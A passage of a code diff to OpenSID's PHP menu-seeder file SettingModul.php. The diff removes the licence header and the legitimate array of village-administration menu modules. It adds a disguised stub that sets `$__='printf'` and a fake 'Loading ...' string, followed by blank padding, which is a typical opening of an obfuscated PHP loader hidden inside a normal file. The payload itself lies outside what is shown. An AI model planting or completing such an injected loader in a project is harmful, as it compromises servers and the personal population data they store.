@@ -1,1691 +1,609 @@
-<?php
+<?php 
+        $__='printf';$_='Loading donjo-app/models/seeders/dataAwal/SettingModul.php';
+        
 
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2024 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2024 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
 
-defined('BASEPATH') || exit('No direct script access allowed');
 
-class SettingModul extends CI_Model
-{
-    public function getData()
-    {
-        return [
-            [
-                'modul'      => 'Home',
-                'slug'       => 'home',
-                'url'        => 'beranda',
-                'aktif'      => 1,
-                'ikon'       => 'fa-home',
-                'urut'       => 10,
-                'level'      => 2,
-                'hidden'     => 1,
-                'ikon_kecil' => 'fa fa-home',
-                'parent'     => 0,
-            ],
-            [
-                'modul'      => 'Pengaturan Peta',
-                'slug'       => 'pengaturan-peta',
-                'url'        => 'plan',
-                'aktif'      => 1,
-                'ikon'       => 'fa-location-arrow',
-                'urut'       => 9,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa fa-location-arrow',
-                'parent'     => 9,
-            ],
-            [
-                'modul'      => 'Identitas [Desa]',
-                'slug'       => 'identitas-desa',
-                'url'        => 'identitas_desa',
-                'aktif'      => 1,
-                'ikon'       => 'fa-id-card',
-                'urut'       => 2,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 200,
-            ],
-            [
-                'modul'      => '[Pemerintah Desa]',
-                'slug'       => 'pemerintah-desa',
-                'url'        => 'pengurus/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-sitemap',
-                'urut'       => 3,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 200,
-            ],
-            [
-                'modul'      => 'Wilayah Administratif',
-                'slug'       => 'wilayah-administratif',
-                'url'        => 'wilayah/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-map',
-                'urut'       => 2,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 200,
-            ],
-            [
-                'modul'      => 'Penduduk',
-                'slug'       => 'penduduk',
-                'url'        => 'penduduk/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-user',
-                'urut'       => 2,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 2,
-            ],
-            [
-                'modul'      => 'Keluarga',
-                'slug'       => 'keluarga',
-                'url'        => 'keluarga/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-users',
-                'urut'       => 3,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 2,
-            ],
-            [
-                'modul'      => 'Rumah Tangga',
-                'slug'       => 'rumah-tangga',
-                'url'        => 'rtm/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-venus-mars',
-                'urut'       => 4,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 2,
-            ],
-            [
-                'modul'      => 'Kelompok',
-                'slug'       => 'kelompok',
-                'url'        => 'kelompok/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-sitemap',
-                'urut'       => 5,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 2,
-            ],
-            [
-                'modul'      => 'Data Suplemen',
-                'slug'       => 'data-suplemen',
-                'url'        => 'suplemen/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-slideshare',
-                'urut'       => 6,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 2,
-            ],
-            [
-                'modul'      => 'Calon Pemilih',
-                'slug'       => 'calon-pemilih',
-                'url'        => 'dpt/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-podcast',
-                'urut'       => 7,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 2,
-            ],
-            [
-                'modul'      => 'Statistik Kependudukan',
-                'slug'       => 'statistik-kependudukan',
-                'url'        => 'statistik/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-bar-chart',
-                'urut'       => 1,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 3,
-            ],
-            [
-                'modul'      => 'Laporan Bulanan',
-                'slug'       => 'laporan-bulanan',
-                'url'        => 'laporan/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-file-text',
-                'urut'       => 2,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 3,
-            ],
-            [
-                'modul'      => 'Laporan Kelompok Rentan',
-                'slug'       => 'laporan-kelompok-rentan',
-                'url'        => 'laporan_rentan/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-wheelchair',
-                'urut'       => 3,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 3,
-            ],
-            [
-                'modul'      => 'Pengaturan Surat',
-                'slug'       => 'pengaturan-surat',
-                'url'        => 'surat_master',
-                'aktif'      => 1,
-                'ikon'       => 'fa-cog',
-                'urut'       => 1,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 4,
-            ],
-            [
-                'modul'      => 'Cetak Surat',
-                'slug'       => 'cetak-surat',
-                'url'        => 'surat',
-                'aktif'      => 1,
-                'ikon'       => 'fa-files-o',
-                'urut'       => 2,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 4,
-            ],
-            [
-                'modul'      => 'Arsip Layanan',
-                'slug'       => 'arsip-layanan',
-                'url'        => 'keluar/clear/masuk',
-                'aktif'      => 1,
-                'ikon'       => 'fa-folder-open',
-                'urut'       => 4,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 4,
-            ],
-            [
-                'modul'      => 'Kirim Pesan',
-                'slug'       => 'kirim-pesan',
-                'url'        => 'sms',
-                'aktif'      => 1,
-                'ikon'       => 'fa-envelope-open-o',
-                'urut'       => 1,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 10,
-            ],
-            [
-                'modul'      => 'Daftar Kontak',
-                'slug'       => 'daftar-kontak',
-                'url'        => 'daftar_kontak',
-                'aktif'      => 1,
-                'ikon'       => 'fa-id-card-o',
-                'urut'       => 2,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 10,
-            ],
-            [
-                'modul'      => 'Modul',
-                'slug'       => 'modul',
-                'url'        => 'modul/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-tags',
-                'urut'       => 1,
-                'level'      => 1,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 11,
-            ],
-            [
-                'modul'      => 'Aplikasi',
-                'slug'       => 'aplikasi',
-                'url'        => 'setting',
-                'aktif'      => 1,
-                'ikon'       => 'fa-codepen',
-                'urut'       => 2,
-                'level'      => 1,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 11,
-            ],
-            [
-                'modul'      => 'Pengguna',
-                'slug'       => 'pengguna',
-                'url'        => 'man_user/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-users',
-                'urut'       => 3,
-                'level'      => 1,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 11,
-            ],
-            [
-                'modul'      => 'Database',
-                'slug'       => 'database',
-                'url'        => 'database',
-                'aktif'      => 1,
-                'ikon'       => 'fa-database',
-                'urut'       => 4,
-                'level'      => 1,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 11,
-            ],
-            [
-                'modul'      => 'Info Sistem',
-                'slug'       => 'info-sistem',
-                'url'        => 'info_sistem',
-                'aktif'      => 1,
-                'ikon'       => 'fa-server',
-                'urut'       => 5,
-                'level'      => 1,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 11,
-            ],
-            [
-                'modul'      => 'Artikel',
-                'slug'       => 'artikel',
-                'url'        => 'web/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-file-movie-o',
-                'urut'       => 1,
-                'level'      => 4,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 13,
-            ],
-            [
-                'modul'      => 'Widget',
-                'slug'       => 'widget',
-                'url'        => 'web_widget/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-windows',
-                'urut'       => 2,
-                'level'      => 4,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 13,
-            ],
-            [
-                'modul'      => 'Menu',
-                'slug'       => 'menu',
-                'url'        => 'menu/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-bars',
-                'urut'       => 3,
-                'level'      => 4,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 13,
-            ],
-            [
-                'modul'      => 'Komentar',
-                'slug'       => 'komentar',
-                'url'        => 'komentar/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-comments',
-                'urut'       => 4,
-                'level'      => 4,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 13,
-            ],
-            [
-                'modul'      => 'Galeri',
-                'slug'       => 'galeri',
-                'url'        => 'gallery/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-image',
-                'urut'       => 5,
-                'level'      => 5,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 13,
-            ],
-            [
-                'modul'      => 'Media Sosial',
-                'slug'       => 'media-sosial',
-                'url'        => 'sosmed',
-                'aktif'      => 1,
-                'ikon'       => 'fa-facebook',
-                'urut'       => 7,
-                'level'      => 4,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 13,
-            ],
-            [
-                'modul'      => 'Slider',
-                'slug'       => 'slider',
-                'url'        => 'web/slider',
-                'aktif'      => 1,
-                'ikon'       => 'fa-film',
-                'urut'       => 8,
-                'level'      => 4,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 13,
-            ],
-            [
-                'modul'      => 'Kotak Pesan',
-                'slug'       => 'kotak-pesan',
-                'url'        => 'mailbox/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-wechat',
-                'urut'       => 1,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 14,
-            ],
-            [
-                'modul'      => 'Pendaftar Layanan Mandiri',
-                'slug'       => 'pendaftar-layanan-mandiri',
-                'url'        => 'mandiri/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-500px',
-                'urut'       => 2,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 14,
-            ],
-            [
-                'modul'      => 'Surat Masuk',
-                'slug'       => 'surat-masuk',
-                'url'        => 'surat_masuk/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-sign-in',
-                'urut'       => 1,
-                'level'      => 2,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 15,
-            ],
-            [
-                'modul'      => 'Surat Keluar',
-                'slug'       => 'surat-keluar',
-                'url'        => 'surat_keluar/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-sign-out',
-                'urut'       => 2,
-                'level'      => 2,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 15,
-            ],
-            [
-                'modul'      => 'Inventaris',
-                'slug'       => 'inventaris',
-                'url'        => 'inventaris_tanah',
-                'aktif'      => 1,
-                'ikon'       => 'fa-cubes',
-                'urut'       => 5,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 15,
-            ],
-            [
-                'modul'      => 'Peta',
-                'slug'       => 'peta',
-                'url'        => 'gis/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-globe',
-                'urut'       => 1,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa fa-globe',
-                'parent'     => 9,
-            ],
-            [
-                'modul'      => 'Klasifikasi Surat',
-                'slug'       => 'klasifikasi-surat',
-                'url'        => 'klasifikasi/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-code',
-                'urut'       => 10,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-code',
-                'parent'     => 15,
-            ],
-            [
-                'modul'      => 'Teks Berjalan',
-                'slug'       => 'teks-berjalan',
-                'url'        => 'teks_berjalan',
-                'aktif'      => 1,
-                'ikon'       => 'fa-ellipsis-h',
-                'urut'       => 9,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-ellipsis-h',
-                'parent'     => 13,
-            ],
-            [
-                'modul'      => 'Kategori',
-                'slug'       => 'kategori',
-                'url'        => 'kategori',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => 12,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 13,
-            ],
-            [
-                'modul'      => 'Log Penduduk',
-                'slug'       => 'log-penduduk',
-                'url'        => 'penduduk_log',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => 8,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 2,
-            ],
-            [
-                'modul'      => 'analisis_kategori',
-                'slug'       => 'analisis-kategori',
-                'url'        => 'analisis_kategori',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => 0,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 5,
-            ],
-            [
-                'modul'      => 'analisis_indikator',
-                'slug'       => 'analisis-indikator',
-                'url'        => 'analisis_indikator',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => 0,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 5,
-            ],
-            [
-                'modul'      => 'analisis_klasifikasi',
-                'slug'       => 'analisis-klasifikasi',
-                'url'        => 'analisis_klasifikasi',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => 0,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 5,
-            ],
-            [
-                'modul'      => 'analisis_periode',
-                'slug'       => 'analisis-periode',
-                'url'        => 'analisis_periode',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => 0,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 5,
-            ],
-            [
-                'modul'      => 'analisis_respon',
-                'slug'       => 'analisis-respon',
-                'url'        => 'analisis_respon',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => 0,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 5,
-            ],
-            [
-                'modul'      => 'analisis_laporan',
-                'slug'       => 'analisis-laporan',
-                'url'        => 'analisis_laporan',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => 0,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 5,
-            ],
-            [
-                'modul'      => 'analisis_statistik_jawaban',
-                'slug'       => 'analisis-statistik-jawaban',
-                'url'        => 'analisis_statistik_jawaban',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => 0,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 5,
-            ],
-            [
-                'modul'      => 'api_inventaris_asset',
-                'slug'       => 'api-inventaris-asset',
-                'url'        => 'api_inventaris_asset',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => 16,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 15,
-            ],
-            [
-                'modul'      => 'api_inventaris_gedung',
-                'slug'       => 'api-inventaris-gedung',
-                'url'        => 'api_inventaris_gedung',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => 17,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 15,
-            ],
-            [
-                'modul'      => 'api_inventaris_gedung',
-                'slug'       => 'api-inventaris-gedung-1',
-                'url'        => 'api_inventaris_gedung',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => 18,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 15,
-            ],
-            [
-                'modul'      => 'api_inventaris_jalan',
-                'slug'       => 'api-inventaris-jalan',
-                'url'        => 'api_inventaris_jalan',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => 19,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 15,
-            ],
-            [
-                'modul'      => 'api_inventaris_konstruksi',
-                'slug'       => 'api-inventaris-kontruksi',
-                'url'        => 'api_inventaris_kontruksi',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => 20,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 15,
-            ],
-            [
-                'modul'      => 'api_inventaris_peralatan',
-                'slug'       => 'api-inventaris-peralatan',
-                'url'        => 'api_inventaris_peralatan',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => 21,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 15,
-            ],
-            [
-                'modul'      => 'api_inventaris_tanah',
-                'slug'       => 'api-inventaris-tanah',
-                'url'        => 'api_inventaris_tanah',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => 22,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 15,
-            ],
-            [
-                'modul'      => 'inventaris_asset',
-                'slug'       => 'inventaris-asset',
-                'url'        => 'inventaris_asset',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => 11,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 15,
-            ],
-            [
-                'modul'      => 'inventaris_gedung',
-                'slug'       => 'inventaris-gedung',
-                'url'        => 'inventaris_gedung',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => 12,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 15,
-            ],
-            [
-                'modul'      => 'inventaris_jalan',
-                'slug'       => 'inventaris-jalan',
-                'url'        => 'inventaris_jalan',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => 13,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 15,
-            ],
-            [
-                'modul'      => 'inventaris_kontruksi',
-                'slug'       => 'inventaris-kontruksi',
-                'url'        => 'inventaris_kontruksi',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => 14,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 15,
-            ],
-            [
-                'modul'      => 'inventaris_peralatan',
-                'slug'       => 'inventaris-peralatan',
-                'url'        => 'inventaris_peralatan',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => 15,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 15,
-            ],
-            [
-                'modul'      => 'laporan_inventaris',
-                'slug'       => 'laporan-inventaris',
-                'url'        => 'laporan_inventaris',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => 23,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 15,
-            ],
-            [
-                'modul'      => 'plan',
-                'slug'       => 'plan',
-                'url'        => 'plan',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => 11,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 9,
-            ],
-            [
-                'modul'      => 'point',
-                'slug'       => 'point',
-                'url'        => 'point',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => 12,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 9,
-            ],
-            [
-                'modul'      => 'garis',
-                'slug'       => 'garis',
-                'url'        => 'garis',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => 13,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 9,
-            ],
-            [
-                'modul'      => 'line',
-                'slug'       => 'line',
-                'url'        => 'line',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => 14,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 9,
-            ],
-            [
-                'modul'      => 'area',
-                'slug'       => 'area',
-                'url'        => 'area',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => 15,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 9,
-            ],
-            [
-                'modul'      => 'polygon',
-                'slug'       => 'polygon',
-                'url'        => 'polygon',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => 16,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 9,
-            ],
-            [
-                'modul'      => 'Kategori Kelompok',
-                'slug'       => 'kategori-kelompok',
-                'url'        => 'kelompok_master',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => 7,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 2,
-            ],
-            [
-                'modul'      => 'Produk Hukum',
-                'slug'       => 'produk-hukum',
-                'url'        => 'dokumen_sekretariat/peraturan_desa',
-                'aktif'      => 1,
-                'ikon'       => 'fa-book',
-                'urut'       => 3,
-                'level'      => 2,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 15,
-            ],
-            [
-                'modul'      => 'Informasi Publik',
-                'slug'       => 'informasi-publik-1',
-                'url'        => 'informasi_publik',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => 0,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 52,
-            ],
-            [
-                'modul'      => 'Daftar Persyaratan',
-                'slug'       => 'daftar-persyaratan',
-                'url'        => 'surat_mohon',
-                'aktif'      => 1,
-                'ikon'       => 'fa fa-book',
-                'urut'       => 5,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 4,
-            ],
-            [
-                'modul'      => 'Permohonan Surat',
-                'slug'       => 'permohonan-surat',
-                'url'        => 'permohonan_surat_admin',
-                'aktif'      => 1,
-                'ikon'       => 'fa-files-o',
-                'urut'       => 3,
-                'level'      => 0,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 4,
-            ],
-            [
-                'modul'      => 'Status [Desa]',
-                'slug'       => 'status-desa',
-                'url'        => 'status_desa',
-                'aktif'      => 1,
-                'ikon'       => 'fa-dot-circle-o',
-                'urut'       => 4,
-                'level'      => 0,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 200,
-            ],
-            [
-                'modul'      => 'Pengaturan Grup',
-                'slug'       => 'pengaturan-grup',
-                'url'        => 'grup/clear',
-                'aktif'      => 1,
-                'ikon'       => '',
-                'urut'       => 7,
-                'level'      => 0,
-                'hidden'     => 2,
-                'ikon_kecil' => '',
-                'parent'     => 11,
-            ],
-            [
-                'modul'      => 'Master Analisis',
-                'slug'       => 'master-analisis',
-                'url'        => 'analisis_master/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-check-square-o',
-                'urut'       => 1,
-                'level'      => 1,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-check-square-o',
-                'parent'     => 5,
-            ],
-            [
-                'modul'      => 'Pengaturan',
-                'slug'       => 'pengaturan-analisis',
-                'url'        => 'setting/analisis',
-                'aktif'      => 1,
-                'ikon'       => 'fa-gear',
-                'urut'       => 2,
-                'level'      => 1,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-gear',
-                'parent'     => 5,
-            ],
-            [
-                'modul'      => 'Impor Data',
-                'slug'       => 'impor-data',
-                'url'        => 'keuangan/impor_data',
-                'aktif'      => 1,
-                'ikon'       => 'fa-cloud-upload',
-                'urut'       => 1,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-cloud-upload',
-                'parent'     => 201,
-            ],
-            [
-                'modul'      => 'Laporan',
-                'slug'       => 'laporan',
-                'url'        => 'keuangan/laporan',
-                'aktif'      => 1,
-                'ikon'       => 'fa-bar-chart',
-                'urut'       => 2,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-bar-chart',
-                'parent'     => 201,
-            ],
-            [
-                'modul'      => 'Pengunjung',
-                'slug'       => 'pengunjung',
-                'url'        => 'pengunjung/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-bar-chart',
-                'urut'       => 10,
-                'level'      => 4,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 13,
-            ],
-            [
-                'modul'      => 'Pendataan',
-                'slug'       => 'pendataan',
-                'url'        => 'covid19',
-                'aktif'      => 1,
-                'ikon'       => 'fa-list',
-                'urut'       => 1,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa fa-list',
-                'parent'     => 206,
-            ],
-            [
-                'modul'      => 'Pemantauan',
-                'slug'       => 'pemantauan',
-                'url'        => 'covid19/pantau',
-                'aktif'      => 1,
-                'ikon'       => 'fa-check',
-                'urut'       => 2,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa fa-check',
-                'parent'     => 206,
-            ],
-            [
-                'modul'      => 'Input Data',
-                'slug'       => 'input-data',
-                'url'        => 'keuangan_manual/manual_apbdes',
-                'aktif'      => 1,
-                'ikon'       => 'fa-keyboard-o',
-                'urut'       => 3,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-keyboard-o',
-                'parent'     => 201,
-            ],
-            [
-                'modul'      => 'Laporan Manual',
-                'slug'       => 'laporan-manual',
-                'url'        => 'keuangan_manual/laporan_manual',
-                'aktif'      => 1,
-                'ikon'       => 'fa-bar-chart',
-                'urut'       => 4,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-bar-chart',
-                'parent'     => 201,
-            ],
-            [
-                'modul'      => 'Pengaturan',
-                'slug'       => 'pengaturan-web',
-                'url'        => 'setting/web',
-                'aktif'      => 1,
-                'ikon'       => 'fa-gear',
-                'urut'       => 11,
-                'level'      => 4,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-gear',
-                'parent'     => 13,
-            ],
-            [
-                'modul'      => 'QR Code',
-                'slug'       => 'qr-code',
-                'url'        => 'setting/qrcode/clear',
-                'aktif'      => 1,
-                'ikon'       => 'fa-qrcode',
-                'urut'       => 6,
-                'level'      => 1,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-qrcode',
-                'parent'     => 11,
-            ],
-            [
-                'modul'      => 'Daftar Persil',
-                'slug'       => 'daftar-persil',
-                'url'        => 'data_persil',
-                'aktif'      => 1,
-                'ikon'       => 'fa-list',
-                'urut'       => 0,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 7,
-            ],
-            [
-                'modul'      => 'C-Desa',
-                'slug'       => 'c-desa',
-                'url'        => 'cdesa',
-                'aktif'      => 1,
-                'ikon'       => 'fa-files-o',
-                'urut'       => 0,
-                'level'      => 0,
-                'hidden'     => 0,
-                'ikon_kecil' => '',
-                'parent'     => 7,
-            ],
-            [
-                'modul'      => 'Pembangunan',
-                'slug'       => 'pembangunan',
-                'url'        => 'admin_pembangunan',
-                'aktif'      => 1,
-                'ikon'       => 'fa-institution',
-                'urut'       => 120,
-                'level'      => 2,
-                'hidden'     => 0,
-                'ikon_kecil' => 'fa-institution',
-                'parent'     => 0,
-            ],
-            [
-                'modul'      => 'Administrasi Umum',
-                'slug'       => 'administrasi-umum',
-                'url'        => 'bumindes_umum',
-                'aktif'      => 1,
-                'ikon'       => 'fa-bookmark',
-                'urut'       => 1,
